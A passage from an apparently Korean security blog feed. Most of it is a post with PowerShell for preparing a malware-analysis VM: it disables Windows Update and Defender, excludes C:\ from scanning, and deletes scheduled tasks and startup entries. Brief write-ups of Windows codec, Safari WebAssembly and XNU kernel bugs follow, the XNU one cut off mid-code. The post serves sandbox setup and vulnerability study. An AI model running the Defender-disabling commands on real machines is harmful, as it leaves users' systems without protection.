class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;AU&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;NoAutoUpdate&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><h1 id="Windows-Defender-비활성화"><a href="#Windows-Defender-비활성화" class="headerlink" title="Windows Defender 비활성화"></a>Windows Defender 비활성화</h1><p>방화벽 비활성화는 Windows Defender 레지스트리에 <code>DisableAntiSpyware</code>만 추가를 해놓았었는데, flare-vm에서 사용하는 코드를 그대로 가져왔습니다.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_defender</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Disable Windows Defender&quot;</span>    <span class="hljs-keyword">try</span>    &#123;        <span class="hljs-built_in">Get-Service</span> WinDefend | <span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-Force</span>        <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Start&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">4</span> <span class="hljs-literal">-Type</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    &#125;    <span class="hljs-keyword">catch</span>    &#123;        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed disable WinDefend Service&quot;</span>    &#125;    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Windows Defender&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableAntiSpyware&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableRoutinelyTakingAction&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Spynet&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SpyNetReporting&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SubmitSamplesConsent&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;MRT&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\MRT&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DontReportInfectionInformation&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">-Not</span> ((<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Class</span> Win32_OperatingSystem).Version <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;6.1.7601&quot;</span>))    &#123;        <span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableArchiveScanning</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBehaviorMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBlockAtFirstSeen</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupQuickScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIntrusionPreventionSystem</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIOAVProtection</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRemovableDriveScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRestorePoint</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningMappedNetworkDrivesForFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningNetworkFiles</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScriptScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableControlledFolderAccess</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableNetworkProtection</span> AuditMode <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-MAPSReporting</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-SubmitSamplesConsent</span> NeverSend <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-PUAProtection</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        &#125;&#125;</code></pre><p>WinDefend Service의 경우 에러가 뜨는 경우가 많아 try-catch 처리를 하였고, 마이크로소프트에 리포트를 보내는 것, 그리고 OS 버전이 6.1.7601 (Windows 7 Service Pack 1)이 아닐 경우 (Windows 10일 경우인 것 같습니다.) Defender에 추가된 다른 설정들을 비활성화해줍니다.</p><p>소스 코드를 가져와서 읽으면서 느낀 건 Windows 7 Service Pack 1로 검사하는 게 아니라 Windows 10과 Server 2019에 대한 Defender 명령어인 것 같은데 <code>[System.Envrionment]::OSVersion.Version.Major -eq 10</code>으로 Windows 10인지 확인하면 되지 않나? 싶었습니다.</p><p>사실상 저는 Windows 10 기준으로 스크립트를 작성했지만요.</p><h1 id="보안-유지-정책-알림-비활성화"><a href="#보안-유지-정책-알림-비활성화" class="headerlink" title="보안 유지 정책 알림 비활성화"></a>보안 유지 정책 알림 비활성화</h1><p>보안 유지 정책 알림 아이콘 비활성화입니다. 이건 굳이 필요 없어 보이긴 하지만 저는 빨간 불이 떠있다거나 느낌표가 떠있다거나 하면 신경이 굉장히 많이 쓰이는 사람이기에…</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%201.png"></p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;HideSCAHealth&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p>찾아보았더니 Microsoft Policies에 <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">HideSCAHealth 레지스트리</a>에 해당 부분을 비활성화할 수 있다는 사실을 알았습니다! 오예 바로 설정하죠! <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer</code>에 <code>HideSCAHealth</code>의 값을 1로 하면 해당 플래그가 설정되어 보안 알림 설정이 숨겨집니다!</p><h1 id="작업-스케줄러-삭제"><a href="#작업-스케줄러-삭제" class="headerlink" title="작업 스케줄러 삭제"></a>작업 스케줄러 삭제</h1><p>이제 Windows에 기본적으로 설정되어 있거나, 다른 애플리케이션을 추가하면서 등록된 불필요한 작업 스케줄러를 삭제할 시간입니다.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%202.png"></p><p>작업 스케줄러에 표시된 이 녀석들을 삭제를 하는 거죠. 이 작업엔 비하인드 에피소드가 있습니다. Task 리스트를 가져와서 모두 삭제를 해버리면 될 거라 생각했어요. 저 부분에 있는 친구들만 가져온다고 생각했습니다.</p><p>근데 테스트를 하는데… Windows 기능이 정상적으로 동작 안 하는 게 있는 거에요… 검색이 안 되고… 왜 이러지? 왜 이러지? 어디가 문제지? 하면서 함수 호출을 하나하나 주석 처리하다가 발견했습니다.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove_task</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$TS</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> Schedule.Service    <span class="hljs-variable">$TS</span>.Connect(<span class="hljs-variable">$env:COMPUTERNAME</span>)    <span class="hljs-variable">$TaskFolder</span> = <span class="hljs-variable">$TS</span>.GetFolder(<span class="hljs-string">&#x27;\&#x27;</span>)    <span class="hljs-variable">$Tasks</span> = <span class="hljs-variable">$TaskFolder</span>.GetTasks(<span class="hljs-number">1</span>)    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Task</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Tasks</span>)    &#123;        <span class="hljs-variable">$TaskFolder</span>.DeleteTask(<span class="hljs-variable">$Task</span>.Name, <span class="hljs-number">0</span>)    &#125;&#125;</code></pre><p>remove task는 ComObject를 통해 Schedule.Service에서 Task 리스트를 가져와서 삭제를 해줍니다. 시스템 스케줄까지 모두 삭제해버려서 발생한 해프닝이었습니다. ㅜ.ㅜ</p><h1 id="시작-프로그램-삭제"><a href="#시작-프로그램-삭제" class="headerlink" title="시작 프로그램 삭제"></a>시작 프로그램 삭제</h1><p>악성코드를 실행하고, 어떤 것들이 autorun 되는지 확인할 때 여러 잡다한 프로그램들이 실행되면 보기 힘들겠죠? 그래서 이것 또한 지워버립시다!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_startup</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$user</span> = <span class="hljs-built_in">New-Object</span> System.Security.Principal.NTAccount(<span class="hljs-variable">$env:username</span>)    <span class="hljs-variable">$sid</span> = (<span class="hljs-variable">$user</span>.Translate([<span class="hljs-type">System.Security.Principal.SecurityIdentifier</span>])).Value    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\<span class="hljs-variable">$sid</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>&#125;</code></pre><p>특정 사용자에 한해 등록된 시작 프로그램은 그 사용자의 SID 경로를 통해 저장이 됩니다. 따라서 사용자에 따른 SID 값을 가져와서 삭제를 해주는 거죠! 일단은… 저렇게 지정을 했는데 안 지워지는 것들이 있더라구요…??? 이유를… 못 찾겠어서 남아있는 거는 손으로 지웠습니다.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%203.png"></p><p>최종본을 가져올 때는 꼭 수정해서 가져올게요! 이번만 너그러이 봐주시면…</p><h1 id="숨김-파일-표시"><a href="#숨김-파일-표시" class="headerlink" title="숨김 파일 표시"></a>숨김 파일 표시</h1><p>이제 숨김 파일과 시스템 숨김 파일들을 표시해봅시다. 설치하고 숨김 파일을 체크하고 하는 것 또한 레지스트리를 통해서 작업할 수 있어요. Windows는 레지스트리를 통해서 이것저것 설정하니까요.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Hidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ShowSuperHidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p><code>Hidden</code>과 <code>ShowSuperHidden</code>의 값을 1로 설정해주면 끝입니다! 이제 기본적인 설정은 완료되었어요.</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>간단한 Windows 설정을 스크립트로 작성해보았습니다. 손으로 해도 얼마 안 걸리지만, 가끔 몇 개 까먹을 때도 있고 귀찮잖아요? 스크립트로 작성하면 실행만 하면 이 모든 것들을 <del>무료!</del> 까먹은 거 없이 설정할 수 있습니다.</p><p>다음 파트에서 chocolatey를 통해서 여러 가지 툴들을 설치하고 개인의 입맛에 맞게 작업 표시줄에 추가, 바탕화면 바로가기 만들기 등에 대해서 알아봅시다. 다음 파트가 모두 진행되고 나면 전체 소스 코드를 github에 올려서 링크를 걸어드리겠습니다! 마지막으로 해당 기능들을 구현할 때 참고 링크들을 작성하며 이만 물러가도록 하겠습니다. 그럼 안뇽~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>disable security maintenance icon: <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.TaskBar2::HideSCAHealth</a></p><p>show hidden files: <a href="https://www.python2.net/questions-1237399.htm">https://www.python2.net/questions-1237399.htm</a></p><p>remove app list: <a href="https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list">https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list</a></p><p>disable windows defender: <a href="https://github.com/fireeye/flare-vm/blob/master/install.ps1">https://github.com/fireeye/flare-vm/blob/master/install.ps1</a></p><p>disable windows update: <a href="https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell">https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell</a></p><p>get specific sid: <a href="https://techexpert.tips/powershell/powershell-get-user-sid/">https://techexpert.tips/powershell/powershell-get-user-sid/</a></p><p>remove all registry key under specific key: <a href="https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key">https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key</a></p><p>remove task: <a href="https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell">https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>powershell</tag>
      
      <tag>automated</tag>
      
      <tag>virtual machine</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</title>
    <link href="/2021/06/06/j0ker/2021-06-06/"/>
    <url>/2021/06/06/j0ker/2021-06-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2137&q=&can=1&sort=-reported">Issue 2137: Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows에서는 Olympus E300의 raw 이미지 파일을 처리할 때, <code>Windows Imaging Component (WIC)</code>를 통해 처리합니다. 이 때 <code>WindowsCodecsRaw.dll</code>의 <code>COlympusE300LoadRaw::olympus_e300_load_raw()</code> 함수가 실행됩니다. 취약점이 발생한 함수의 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> CLASS <span class="hljs-title">olympus_e300_load_raw</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;  uchar  *data,  *dp;  ushort *pixel, *pix;  <span class="hljs-keyword">int</span> dwide, row, col;  dwide = raw_width * <span class="hljs-number">16</span> / <span class="hljs-number">10</span>;               <span class="hljs-comment">// (1)</span>  data = <span class="hljs-built_in">malloc</span> (dwide + raw_width*<span class="hljs-number">2</span>);  merror (data, <span class="hljs-string">&quot;olympus_e300_load_raw()&quot;</span>);  pixel = (ushort *) (data + dwide);  <span class="hljs-keyword">for</span> (row=<span class="hljs-number">0</span>; row &lt; height; row++) &#123;    fread (data, <span class="hljs-number">1</span>, dwide, ifp);    <span class="hljs-keyword">for</span> (dp=data, pix=pixel; pix &lt; pixel+raw_width; dp+=<span class="hljs-number">3</span>, pix+=<span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">//  (2)</span>      <span class="hljs-keyword">if</span> (((dp-data) &amp; <span class="hljs-number">15</span>) == <span class="hljs-number">15</span>) dp++;      pix[<span class="hljs-number">0</span>] = dp[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span> | dp[<span class="hljs-number">0</span>];                                    <span class="hljs-comment">// (3)</span>      pix[<span class="hljs-number">1</span>] = dp[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">4</span> | dp[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>;                               <span class="hljs-comment">// (4)</span>    &#125;    <span class="hljs-keyword">for</span> (col=<span class="hljs-number">0</span>; col &lt; width; col++)      BAYER(row,col) = (pixel[col] &amp; <span class="hljs-number">0xfff</span>);  &#125;  <span class="hljs-built_in">free</span> (data);&#125;</code></pre><p>먼저 (1)에서 디코딩된 데이터를 저장할 메모리를 할당합니다. 디코딩은 열 단위로 디코딩을 진행하는데, 한 열에는 <code>height</code>만큼의 픽셀이 존재하며 픽셀은 각각 2 bytes의 데이터로 디코딩 됩니다. 그리고 (2)에서부터 실질적인 디코딩 작업이 진행됩니다. 조건문을 <code>pix &lt; pixel+raw_width</code>로 설정함으로써 디코딩 과정에서 OOB가 발생하지 않도록 신경썼지만 <code>raw_width</code>가 <code>0xd79</code>같이 홀수일 경우, 한 픽셀 당 2 bytes 씩 디코드하기 때문에 해당 loop의 마지막에서 (3)에서는 버퍼의 마지막에 데이터를 쓰지만 (4)에서 버퍼 밖의 메모리 영역에 데이터를 쓰게 되어 1 byte 의 OOB Write가 발생하게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>microsoft</tag>
      
      <tag>oob</tag>
      
      <tag>j0ker</tag>
      
      <tag>WindowsCodecsRaw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30734: Safari WebAssembly LLInt에서 발견된 Integer Overflow 취약점</title>
    <link href="/2021/06/05/fabu1ous/2021-06-05/"/>
    <url>/2021/06/05/fabu1ous/2021-06-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/">Exploitation of a JavaScriptCore WebAssembly Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Safari &lt;14.1.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Safari의 WebAssembly는 세 단계를 거쳐 실행되는데 그 첫 번째 단계인 LLInt(Low Level Interpreter)에 interger overflow 취약점(CVE-2021-30734)이 발생하여 Safari 14.1.1 버전에서 패치되었습니다. LLInt의 Parser는 함수의 유효성을 검사하는 과정에서 <code>m_max_StackSize</code> 필드를 사용해 함수가 사용할 스택의 최대 크기를 추적합니다. 파싱이 끝나면 <code>m_max_StackSize</code> 값을 16 byte alignment로 맞추기 위해 <code>LLIntGenerator::Finalize</code> 함수를 호출해 반올림하고 <code>m_numCalleeLocals</code> 필드에 저장합니다. </p><p>만약 <code>m_max_StackSize</code> 값이 <code>0xffffffff</code>이라면 16 byte alignment를 맞추기 위해 올림 계산을 하게 되어 integer overflow가 발생하고 <code>m_numCalleeLocals</code>의 값이 <code>0x0</code>으로 저장됩니다. 함수가 실제로 사용하는 스택의 크기와 LLInt가 추적하는 크기가 서로 달라지게 되고 메모리 오염으로 이어집니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>safari</tag>
      
      <tag>wasm</tag>
      
      <tag>int overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30660: macOS 및 iOS의 커널 메모리 유출 취약점</title>
    <link href="/2021/06/04/l0ch/2021-06-04/"/>
    <url>/2021/06/04/l0ch/2021-06-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://support.apple.com/en-us/HT212325">macOS 11.3 이전 release</a></li><li><a href="https://support.apple.com/en-us/HT212317">iOS 14.5 이전 release</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple사의 macOS 및 iOS의 XNU 시스템에서 커널 메모리를 유출할 수 있는 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>XNU의 syscall <code>SYS_msgsnd_nocancel</code> 의 핸들러인 <a href="https://opensource.apple.com/source/xnu/xnu-1504.7.4/bsd/kern/sysv_msg.c.auto.html">sysv_msg.c/msgrcv_nocancel()</a> 는 유저 공간의 메시지 크기를 <code>msgsz</code>로 받습니다. 만약 유저 공간에서 요청된 크기가 초기에 커널에 전송된 크기 <code>msghdr→msg_ts</code>보다 크면 아래와 같이 <code>msghdr→msg_ts</code>로 자릅니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (msgsz &gt; msghdr-&gt;msg_ts) 